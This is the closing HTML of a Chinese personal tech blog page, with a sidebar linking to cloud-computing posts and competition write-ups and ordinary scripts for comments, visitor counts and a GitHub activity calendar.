title="云计算方向-Ansible搭建wordpress">云计算方向-Ansible搭建wordpress</a><time datetime="2025-05-14T02:48:38.000Z" title="发表于 2025-05-14 10:48:38">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"/></a><div class="content"><a class="title" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题">云计算方向-2023年金砖一带一路职业技能大赛云计算赛题</a><time datetime="2025-05-14T02:48:37.000Z" title="发表于 2025-05-14 10:48:37">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d5ee981d.html" title="云计算方向-2023年一带一路职业技能大赛云计算(样题)"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年一带一路职业技能大赛云计算(样题)"/></a><div class="content"><a class="title" href="/posts/d5ee981d.html" title="云计算方向-2023年一带一路职业技能大赛云计算(样题)">云计算方向-2023年一带一路职业技能大赛云计算(样题)</a><time datetime="2025-05-14T02:48:35.000Z" title="发表于 2025-05-14 10:48:35">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a8884406.html" title="云计算方向-2023年金砖大赛"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年金砖大赛"/></a><div class="content"><a class="title" href="/posts/a8884406.html" title="云计算方向-2023年金砖大赛">云计算方向-2023年金砖大赛</a><time datetime="2025-05-14T02:48:32.000Z" title="发表于 2025-05-14 10:48:32">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cc6b9ff2.html" title="云计算方向-2023年GZ075 云计算应用赛项赛题"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年GZ075 云计算应用赛项赛题"/></a><div class="content"><a class="title" href="/posts/cc6b9ff2.html" title="云计算方向-2023年GZ075 云计算应用赛项赛题">云计算方向-2023年GZ075 云计算应用赛项赛题</a><time datetime="2025-05-14T02:47:38.000Z" title="发表于 2025-05-14 10:47:38">2025-05-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bottom-bg.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By GoldY</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'cloud1-4gf5w5mt9238c0f5',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'cloud1-4gf5w5mt9238c0f5',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
  <script data-pjax src="/js/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=yuwenjin666";
            var git_color =['#ebedf0', '#a2f7af', '#6ce480', '#54ad63', '#469252', '#31753c', '#1f5f2a', '#13531f', '#084111', '#032b09', '#000000'];
            var git_user ="yuwenjin666";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>